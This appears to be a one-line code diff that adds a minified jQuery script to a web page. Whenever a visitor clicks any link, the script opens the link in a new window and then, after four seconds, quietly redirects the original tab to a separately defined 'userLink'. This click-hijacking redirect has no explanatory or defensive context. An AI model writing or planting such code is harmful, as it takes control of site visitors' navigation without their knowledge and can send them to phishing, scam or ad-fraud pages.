@@ -1,0 +1,1 @@
+$(document).ready(function(){$(document).on("click","a",function(){if(null!=$(this).attr("href"))return window.open($(this).attr("href")),setTimeout(function(){window.location.href=userLink},4e3),!1;window.location.href=userLink})});
